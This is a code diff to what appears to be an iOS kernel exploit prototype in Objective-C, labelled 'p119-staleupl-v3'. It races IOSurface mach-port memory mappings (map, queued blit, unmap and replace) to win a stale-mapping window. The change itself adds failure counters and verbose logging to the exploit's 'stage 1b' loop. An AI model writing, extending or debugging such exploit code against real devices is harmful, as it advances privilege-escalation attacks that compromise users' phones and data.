@@ -57,7 +57,7 @@
 #import <unistd.h>
 #import <sys/mman.h>
 
-#define P119_BUILD      @"p119-staleupl-v2"
+#define P119_BUILD      @"p119-staleupl-v3"
 
 /* the P069 prototype law: mach_vm has no SDK header for these decls */
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
@@ -384,11 +384,19 @@ static NSString *p119_finish(void) {
         L(@"");
         L(@"--- Stage 1b: entry-port map → queued blit → unmap+replace → wait ---");
         L(@"[IN FLIGHT] stage-1b window race begins — one tap per force-quit.");
-        atomic_ulong b_ok = 0, b_rep_fail = 0;
+        atomic_ulong b_ok = 0, b_rep_fail = 0, b_mkport_fail = 0, b_map_fail = 0;
         NSDate *t1b = [NSDate date];
+        int printed_fail = 0;
         for (int iter = 0; iter < 256 && -[t1b timeIntervalSinceNow] < 12.0; iter++) {
             mach_port_t mp = pMkPort(g_surf);
-            if (!mp) break;
+            if (!mp) {
+                atomic_fetch_add(&b_mkport_fail, 1);
+                if (printed_fail++ < 2)
+                    Lf(@"[1b] IOSurfaceCreateMachPort returned NULL (iter=%d) — "
+                       @"the 0x82-type surface may refuse a mach port; v2's "
+                       @"silent break is now loud", iter);
+                break;
+            }
             mach_vm_address_t addr = 0;
             kern_return_t mkr = mach_vm_map(mach_task_self(), &addr,
                                             (mach_vm_size_t)4096, 0, VM_FLAGS_ANYWHERE,
@@ -397,6 +405,10 @@ static NSString *p119_finish(void) {
                                             VM_PROT_READ | VM_PROT_WRITE,
                                             VM_INHERIT_NONE);
             if (mkr != KERN_SUCCESS) {
+                atomic_fetch_add(&b_map_fail, 1);
+                if (printed_fail++ < 4)
+                    Lf(@"[1b] mach_vm_map kr=0x%08x (iter=%d) — the P069 route "
+                       @"failed; printing the law instead of silence", mkr, iter);
                 mach_port_deallocate(mach_task_self(), mp);
                 continue;
             }
@@ -438,8 +450,9 @@ static NSString *p119_finish(void) {
         bnext:
             usleep(1000);
         }
-        Lf(@"[*] stage-1b done: rounds=%lu unmap_ok=%lu rep_fail=%lu",
-           atomic_load(&b_ok), atomic_load(&g_unmap_ok), atomic_load(&b_rep_fail));
+        Lf(@"[*] stage-1b done: rounds=%lu unmap_ok=%lu rep_fail=%lu mkport_fail=%lu mapfail_last=%lu",
+           atomic_load(&b_ok), atomic_load(&g_unmap_ok), atomic_load(&b_rep_fail),
+           atomic_load(&b_mkport_fail), atomic_load(&b_map_fail));
     } else {
         L(@"[-] IOSurfaceCreateMachPort missing — stage 1b skipped honestly");
     }
